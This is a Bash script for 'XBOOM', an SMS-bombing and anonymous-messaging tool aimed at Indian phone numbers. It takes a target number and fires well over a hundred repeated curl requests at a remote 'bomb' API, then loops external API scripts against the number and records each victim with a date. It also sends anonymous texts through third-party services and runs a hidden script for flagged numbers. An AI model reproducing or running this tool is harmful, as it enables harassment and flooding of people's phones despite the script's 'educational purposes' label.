#!/bin/bash

#------------------------------------------------------#
#             Dont try to Steal it Ra Howlay           #
#------------------------------------------------------#

# Colors FG

RED="$(printf '\e[31m')"
GREEN="$(printf '\e[32m')"
ORANGE="$(printf '\e[33m')"
BLUE="$(printf '\e[34m')"
MAGENTA="$(printf '\e[35m')"
CYAN="$(printf '\e[36m')"
WHITE="$(printf '\e[37m')"
BLACK="$(printf '\e[30m')"

apt-get install -y git curl wget pv espeak

#    Check Internet
wget -q --spider https://google.com

if [ $? -eq 0 ]; then
    just
else
    clear
    echo -e "\e[1;34m‎‎‏‏ ‎"
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    sleep 2
    exit
fi

clear
just() {
clear
echo ""
echo ""
printf  "                      \e[1;33m|C|O|N|N|E|C|T|I|N|G|"
echo ""
echo ""
echo ""
}


banner() {

echo -e "\e[1;34m‎‎‏‏‎ ‎"
sleep 1
echo "$WHITE             Author:$RED Kv Justin"
echo ""
sleep 1
echo -e "            \e[36m$WHITE Group:$BLUE CSE Thopulu"
echo ""
sleep 1
echo -e "            \e[36m$WHITE Project Name:$MAGENTA XBOOM V3.1"
echo ""

}


updatee() {
clear
echo ""
echo "$CYAN█░█ █▀█ █▀▄ ▄▀█ ▀█▀ █ █▄░█ █▀▀   █▀ █▀▀ █▀█ █ █▀█ ▀█▀"
echo "$WHITE█▄█ █▀▀ █▄▀ █▀█ ░█░ █ █░▀█ █▄█   ▄█ █▄▄ █▀▄ █ █▀▀ ░█░"
echo ""
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Requesting Update From Source...\e[93m"
sleep 2
clear
echo ""
cd ..
rm -rf xboom
git clone https://github.com/kvjustin/xboom > /dev/null 2>&1
cd xboom
chmod +x xboom.sh
clear
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[0m Request Attempt Successful..\e[93m"
sleep 1
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Updating Now...\e[93m"
sleep 2
echo ""
clear
echo ""
echo "$GREEN █▀ █▀▀ █▀█ █ █▀█ ▀█▀   █░█ █▀█ █▀▄ ▄▀█ ▀█▀ █▀▀ █▀▄"
echo "$WHITE ▄█ █▄▄ █▀▄ █ █▀▀ ░█░   █▄█ █▀▀ █▄▀ █▀█ ░█░ ██▄ █▄▀ "
echo ""
sleep 3
echo ""
echo -e "        \e[92m[\e[91m~\e[92m]\e[91m Restarting XBOOM !\e[93m"
sleep 2
bash xboom.sh
}


bombrecord() {
clear
echo ""
echo "$WHITE █▀▀█ █▀▀█ █▀▄▀█ █▀▀▄ 　  █▀▀█ █▀▀ █▀▀ █▀▀█ █▀▀█ █▀▀▄ "
echo "$GREEN █▀▀▄ █░░█ █░▀░█ █▀▀▄ 　  █▄▄▀ █▀▀ █░░ █░░█ █▄▄▀ █░░█ "
echo "$WHITE █▄▄█ ▀▀▀▀ ▀   ▀ ▀▀▀  　  █  █ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀ ▀▀ ▀▀▀ "
echo ""
echo ""
echo -e "     \e[92m[\e[36m~\e[92m]\e[93m This is a record of numbers which had been bombed !\e[93m" | pv -qL 30
echo " $GREEN"
cat .bombrecord.txt
sleep 2
menux
}

PW_WD=$(pwd)
cd model
cp headapis $PW_WD
cp tailapis $PW_WD
cp anonapi $PW_WD
cd ..


about() {
clear
echo -e '''
         \e[1;91m      ╔═══════════╗
         \e[1;91m    ╔═╝\e[1;97m███████████\e[1;91m╚═╗
         \e[1;91m   ╔╝\e[1;97m███████████████\e[1;91m╚╗
         \e[1;91m   ║\e[1;97m████\e[1;92mKv Justin\e[1;97m████\e[1;91m║
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█\e[1;91m╔\e[1;97m█████████████\e[1;91m╗\e[1;97m█\e[1;91m║\e[1;91m
         \e[1;91m   ╚╦╝\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;91m╚╦╝\e[1;91m
         \e[1;91m   ╔╝\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m╚╗\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒▒\e[1;97m██\e[1;91m|\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m█████\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m║\e[1;94m
         \e[1;91m   ╚╗\e[1;97m███████████████\e[1;91m╔╝\e[1;94m
         \e[1;91m  ╔═╬══╦╝\e[1;97m██\e[1;90m▒\e[1;97m█\e[1;90m▒\e[1;97m██\e[1;91m╚╦══╝\e[1;90m .▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█████████\e[1;91m║\e[1;90m ...▒.       \e[1;93m
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║\e[1;90m　.▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══╚═╩══╩╦═╩═╩═╦╗\e[1;90m▒.
         \e[1;91m ╔╝\e[1;97m█\e[1;91m╚══╦═╦══╦╩═╦═╦═╩╝  \e[38;5;48m
         \e[1;91m╔╝\e[1;97m█████\e[1;91m║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║
         \e[1;91m║\e[1;97m██████\e[1;91m║\e[1;97m█████████\e[1;91m║
''' | pv -qL 300
sleep 1.2
echo ""
printf "\e[0m\e[92m        $ORANGE ✯ Name    :$WHITE Krishna\e[0m\n" | pv -qL 12
echo ""
printf "\e[0m\e[92m        $ORANGE ✯ Alias   :$WHITE Kv Justin\e[0m\n" | pv -qL 12
echo ""
printf "\e[0m\e[92m        $ORANGE ✯ Version :$WHITE 3.1\e[0m\n" | pv -qL 12
echo ""
printf "\e[0m\e[92m        $ORANGE ✯ Group   :$WHITE CSE Thopulu\e[0m\n" | pv -qL 12
sleep 5
menux
}

eexec() {
echo "Under construction"
exit
}


menu() {
clear
echo ""
echo "$WHITE█▀▄▀█ ▄▀█ █▀ █▀   █▄▄ █▀█ █▀▄▀█ █▄▄ █ █▄░█ █▀▀"
echo "$RED█░▀░█ █▀█ ▄█ ▄█   █▄█ █▄█ █░▀░█ █▄█ █ █░▀█ █▄█"
echo ""
echo ""
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m Continue... \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m Go Back \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "1" ];then
        bombing-menu
fi
if [ "$options" -eq "2" ];then
        menux
fi
}

bombing-menu() {
clear
echo ""
echo "$WHITE█▀▄▀█ ▄▀█ █▀ █▀   █▄▄ █▀█ █▀▄▀█ █▄▄ █ █▄░█ █▀▀"
echo "$RED█░▀░█ █▀█ ▄█ ▄█   █▄█ █▄█ █░▀░█ █▄█ █ █░▀█ █▄█"
echo ""
echo ""
printf "  \e[1;92m[\e[0m xboom\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read targett
curl -s "https://kvjustin-server.herokuapp.com/$targett" > .output2.txt
output2=$(cat .output2.txt | grep "asdfghjklzxcvbnmpoiuyt")
if [[ $output2 = "asdfghjklzxcvbnmpoiuyt" ]]
then
bash .notyourbusiness.sh
exit
fi
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett" > .output.txt
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
curl -s "https://xlr8-api.herokuapp.com/bomb/$targett"
output=$(cat .output.txt | grep "Bombing Started")
if [[ $output = "Bombing Started" ]]
then
printf "\n"
echo ""
Date=$(date)
echo -e "      $targett was bombed on $Date"  >> .bombrecord.txt
printf "  $RED                           ▂▂▂\n"
printf "  $RED                   ░░░░░░███████▄▄▄▄▄▄▄▄▃▂\n"
printf "  $WHITE                    ▂▄▅███\e[1;31mXBOOM\e[1;0m███▅▄▃▂\n"
printf "  $RED                  [███████████████████]\n"
printf "  $WHITE                    ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤\n"
echo ""
printf "             ~~~\e[1;92m Attack Started On +91$targett \e[0m~~~"
sleep 1
echo ""
echo ""
printf "\n"
printf "   Press ctrl+c to quit ! \n"
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m ~~~ The Bomber will automatically stop after 5 min\e[93m"
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m ~~~ Please Wait For Few Min !!\e[93m"
echo ""



while read a; do
    echo ${a//€shushhi/$targett}
done < headapis > headapis.t
mv headapis{.t,}

while read a; do
    echo ${a//€shushhi/$targett}
done < tailapis > tailapis.t
mv tailapis{.t,}

for i in {1..4}
do bash headapis
done

for i in {1..27}
do bash tailapis
done

bomb-return
fi
}

bomb-return(){
clear
echo ""
echo "$WHITE█▀▄▀█ ▄▀█ █▀ █▀   █▄▄ █▀█ █▀▄▀█ █▄▄ █ █▄░█ █▀▀"
echo "$RED█░▀░█ █▀█ ▄█ ▄█   █▄█ █▄█ █░▀░█ █▄█ █ █░▀█ █▄█"
echo ""
echo ""
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m Bomb Again... \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m Go Back To Home \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "1" ];then
        bombing-menu
fi
if [ "$options" -eq "2" ];then
        menux
fi
}

anonmsg(){
clear
echo ""

echo "$RED ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "$WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
echo ""
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m Continue... \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m Go Back \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "1" ];then
        anon-msg
fi
if [ "$options" -eq "2" ];then
        menux
fi
}

anon-msg(){
clear
echo ""

echo "$RED ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "$WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
echo ""
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m Server 1 \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m Server 2 \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "1" ];then
        anon-serv1
fi
if [ "$options" -eq "2" ];then
        anon-serv2
fi
}

anon-serv1(){
clear
echo ""

echo "$RED ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "$WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
echo ""
printf "      \e[1;92m[\e[0m xboom\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read smstarget
echo ""
printf "      \e[1;92m[\e[0m xboom\e[1;92m ]\e[0m \e[1;93mEnter Your Message  >>> \e[0m"
read text
echo ""

curl -X POST https://textbelt.com/text \
       --data-urlencode phone='91$smstarget' \
       --data-urlencode message='$text' \
       -d key=textbelt -s > records.txt

value=$( grep -o "true" records.txt)

if [[ $value = "true" ]]
then
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mSuccess !!\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Please be pateint, Msgs take some time to get delivered !!\e[93m"
echo ""
exit
else
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mError 404 ! $RED(╥﹏╥)\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m This feature doesn't works sometimes !!\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Remember you can only send one msg per day !\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Try Server 2 !\e[93m"
echo ""
sleep 2
anon-return
fi
}

anon-serv2(){
clear
echo ""

echo "$RED ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "$WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
echo ""
printf "  \e[1;92m[\e[0m xboom\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read smstarget
echo ""
printf "  \e[1;92m[\e[0m xboom\e[1;92m ]\e[0m \e[1;93mEnter Your Message  >>> \e[0m"
read text
echo ""

while read a; do
    echo ${a//₹axx/$smstarget}
done < anonapi > anonapi.t
mv anonapi{.t,}
while read a; do
    echo ${a//€amsg/$text}
done < anonapi > anonapi.t
mv anonapi{.t,}
bash anonapi > records.txt
value=$( grep -o "true" records.txt)
if [[ $value = "true" ]]
then
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mSuccess !!\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Please be pateint, Msgs take some time to get delivered !!\e[93m"
echo ""
exit
else
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[93m Error 404 ! $RED(╥﹏╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m This feature doesn't works sometimes !!\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Remember you can only send one msg per day !\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Try Server 1 !\e[93m"
echo ""
sleep 2
anon-return
fi
}

anon-return(){
clear
echo ""

echo "$RED ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "$WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
echo ""
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m Retry... \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m Go Back To Home \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "1" ];then
        anon-msg
fi
if [ "$options" -eq "2" ];then
        menux
fi
}

menux() {
clear
banner
sleep 1
DATE=$(date)
echo "$WHITE-----------------------------------------"
echo "$WHITE ✯ Started on $RED$DATE"
echo "$WHITE-----------------------------------------"
echo -e "$RED ⚡ This tool is only for Educational Purposes !"
echo "$WHITE------------------------------------------------"
echo -e "\e[1;33m $BLUE✯ Just Do It for fun!!\e[0m"
echo "$WHITE------------------------"
echo -e "\e[34m $GREEN✯ XBOOM Works Only In India :)"
echo "$WHITE------------------------------"
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m MASS BOMBING V3.1 \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m ANONYMOUS MSG \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;33m UPDATE \e[0m\n"
printf "\e[1;92m[\e[0m 4\e[1;92m ]\e[0m>>>\e[1;33m ABOUT \e[0m\n"
printf "\e[1;92m[\e[0m 5\e[1;92m ]\e[0m>>>\e[1;33m BOOM LIST \e[0m\n"
printf "\e[1;92m[\e[0m 6\e[1;92m ]\e[0m>>>\e[1;33m QUIT \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
        anonmsg
fi
if [ "$options" -eq "3" ];then
        updatee
fi
if [ "$options" -eq "4" ];then
        about
fi
if [ "$options" -eq "5" ];then
        bombrecord
fi
if [ "$options" -eq "007" ];then
        eexec
fi
if [ "$options" -eq "6" ];then
        echo ""
        echo -e "\e[92m[\e[91m~\e[92m]\e[93m Thanks for Using XBOOM !\e[93m"
        echo ""
        clear
        exit
else
        menux
fi


}
menux
